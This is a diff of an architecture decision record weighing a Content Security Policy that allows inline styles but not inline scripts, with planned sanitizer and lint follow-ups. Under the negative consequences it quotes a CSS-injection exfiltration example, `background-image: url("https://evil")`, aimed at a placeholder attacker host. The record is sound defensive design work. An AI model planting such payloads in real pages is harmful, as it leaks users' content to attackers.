@@ -20,15 +20,18 @@ The shipped CSP allows `style-src 'self' 'unsafe-inline'`. `script-src 'self'` r
 ## Consequences
 
 ### Positive
+
 - React stays simple; no CSS-in-JS runtime injector; no nonce plumbing.
 - Dynamic decorations (selection highlights, caret, ruler guides) work without per-decoration CSP exceptions.
 - Supply-chain-induced CSS injection is bounded by the sanitizer, not by CSP alone.
 
 ### Negative
+
 - A successful CSS-injection attack can exfiltrate some content via `background-image: url("https://evil")` — but `img-src 'self' data: blob:` (no remote) blocks this for HTTP exfiltration, so the practical exfil surface is narrow.
 - The "no `'unsafe-inline'` anywhere" bar is not met; reviewers must understand the asymmetry between style and script.
 
 ### Follow-up required
+
 - Land the `dangerouslySetInnerHTML` lint rule (`tooling/eslint-config`).
 - Add a CSS tokenizer sanitizer to `@word/html-io`.
 - Penetration-test the sanitizer against the OWASP CSS injection corpus.
